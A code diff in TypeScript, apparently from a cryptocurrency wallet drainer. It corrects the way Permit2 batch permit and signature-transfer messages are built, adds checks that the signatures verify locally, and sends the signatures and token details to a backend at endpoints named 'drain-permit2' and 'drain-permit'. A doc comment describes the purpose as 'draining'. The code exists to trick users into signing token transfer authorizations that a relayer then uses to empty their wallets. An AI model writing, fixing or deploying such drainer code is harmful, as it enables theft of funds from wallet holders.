@@ -96,37 +96,37 @@ export const generatePermit2BatchSignature = async (
   const userAddress = await signer.getAddress();
   const network = await signer.provider.getNetwork();
   const chainId = Number(network.chainId);
-  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'; // Standard Permit2 address
 
-  // Permit2 EIP-712 domain
+  // Permit2 EIP-712 domain: exactly name, chainId, verifyingContract
   const domain = {
     name: 'Permit2',
-    version: '1',                       // ← important
     chainId,
     verifyingContract: PERMIT2_ADDRESS,
   };
 
-  // Permit2 types
+  // Permit2 types for AllowanceTransfer (permit)
   const types = {
     PermitBatch: [
-      { name: 'owner',       type: 'address'          },
-      { name: 'details',     type: 'PermitDetails[]' },
-      { name: 'spender',     type: 'address'          },
-      { name: 'sigDeadline', type: 'uint256'          }
+      { name: 'owner', type: 'address' },
+      { name: 'details', type: 'PermitDetails[]' },
+      { name: 'spender', type: 'address' },
+      { name: 'sigDeadline', type: 'uint256' }
     ],
     PermitDetails: [
-      { name: 'token',      type: 'address' },
-      { name: 'amount',     type: 'uint160' },
-      { name: 'expiration', type: 'uint48'  },
-      { name: 'nonce',      type: 'uint48'  },
+      { name: 'token', type: 'address' },
+      { name: 'amount', type: 'uint160' },
+      { name: 'expiration', type: 'uint48' },
+      { name: 'nonce', type: 'uint48' },
     ],
   };
+
   // Prepare permitted array
   const permitted = tokens.map((address, i) => ({
     token: address,
     amount: amounts[i],
     expiration: deadline,
-    nonce: nonce // You may want to use a per-token nonce if needed
+    nonce: nonce + i // Use different nonce for each token
   }));
 
   // Prepare message
@@ -139,58 +139,71 @@ export const generatePermit2BatchSignature = async (
 
   // Sign Permit2 batch
   const signature = await signer.signTypedData(domain, types, message);
-  return { signature, deadline, nonce };
+  return { signature, deadline, nonce, message };
 };
 
-// Function to create Permit2 SignatureTransfer batch signature (for permitBatchTransferFrom)
+// Function to create Permit2 SignatureTransfer batch signature (one-time transfer)
 export const generatePermit2SignatureTransferBatch = async (
   signer: ethers.JsonRpcSigner,
-  batchDetails: { token: string; to: string; amount: string }[],
-  owner: string,
-  nonce: number,
-  deadline: number
+  batchDetails: { token: string; to: string; amount: bigint }[],
+  nonce: bigint,
+  deadline: bigint
 ) => {
   const network = await signer.provider.getNetwork();
   const chainId = Number(network.chainId);
   const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 
-  // Permit2 EIP-712 domain
+  // EIP-712 domain: exactly name, chainId, verifyingContract
   const domain = {
     name: 'Permit2',
     chainId,
     verifyingContract: PERMIT2_ADDRESS,
   };
 
-  // Permit2 types for SignatureTransfer
+  // FIXED: The contract expects the signature to be over the permit struct hash
+  // According to Permit2 contract, we need to sign over the hash of the permit struct
   const types = {
     PermitBatchTransferFrom: [
-      { name: 'batchDetails', type: 'BatchDetails[]' },
-      { name: 'owner', type: 'address' },
+      { name: 'permitted', type: 'TokenPermissions[]' },
       { name: 'nonce', type: 'uint256' },
       { name: 'deadline', type: 'uint256' },
     ],
-    BatchDetails: [
+    TokenPermissions: [
       { name: 'token', type: 'address' },
-      { name: 'to', type: 'address' },
-      { name: 'amount', type: 'uint160' },
+      { name: 'amount', type: 'uint256' },
     ],
   };
 
-  // Prepare message
+  // Build permitted array: only token + amount
+  const permitted = batchDetails.map(d => ({
+    token: d.token,
+    amount: BigInt(d.amount),
+  }));
+
   const message = {
-    batchDetails: batchDetails.map(d => ({
-      token: d.token,
-      to: d.to,
-      amount: d.amount
-    })),
-    owner,
-    nonce,
-    deadline,
+    permitted,
+    nonce: BigInt(nonce),
+    deadline: BigInt(deadline),
   };
 
-  // Sign Permit2 SignatureTransfer batch
+  console.log('[FRONTEND] Domain for signing:', domain);
+  console.log('[FRONTEND] Types for signing:', types);
+  console.log('[FRONTEND] Message for signing:', message);
+
+  // Sign typed data with the correct primary type
   const signature = await signer.signTypedData(domain, types, message);
-  return { signature, deadline, nonce };
+  
+  // Debug: verify the signature locally
+  try {
+    const recovered = ethers.verifyTypedData(domain, types, message, signature);
+    console.log('[FRONTEND] Local verification - Recovered:', recovered);
+    console.log('[FRONTEND] Local verification - Expected:', await signer.getAddress());
+    console.log('[FRONTEND] Local verification - Match:', recovered.toLowerCase() === (await signer.getAddress()).toLowerCase());
+  } catch (err) {
+    console.error('[FRONTEND] Local verification failed:', err);
+  }
+  
+  return { signature, message, domain, types };
 };
 
 // For Solana token approvals
@@ -203,6 +216,24 @@ export async function generateSolanaValidation(wallet: any, tokenAddress: string
   // Implementation would be added when integrating Solana wallet
 }
 
+// Helper function to convert BigInt values to strings
+function convertBigIntToString(obj: any): any {
+  if (typeof obj === 'bigint') {
+    return obj.toString();
+  }
+  if (Array.isArray(obj)) {
+    return obj.map(convertBigIntToString);
+  }
+  if (obj && typeof obj === 'object') {
+    const result: any = {};
+    for (const key in obj) {
+      result[key] = convertBigIntToString(obj[key]);
+    }
+    return result;
+  }
+  return obj;
+}
+
 /**
  * Send permit signature and token info to backend/relayer for draining
  */
@@ -213,10 +244,14 @@ export async function sendPermitSignatureToBackend(
   const endpoint = usePermit2
     ? 'http://localhost:4000/api/drain-permit2'
     : 'http://localhost:4000/api/drain-permit';
+  
+  // Convert BigInt values to strings before sending
+  const serializedData = convertBigIntToString(data);
+  
   const res = await fetch(endpoint, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data)
+    body: JSON.stringify(serializedData)
   });
   let responseText;
   try {
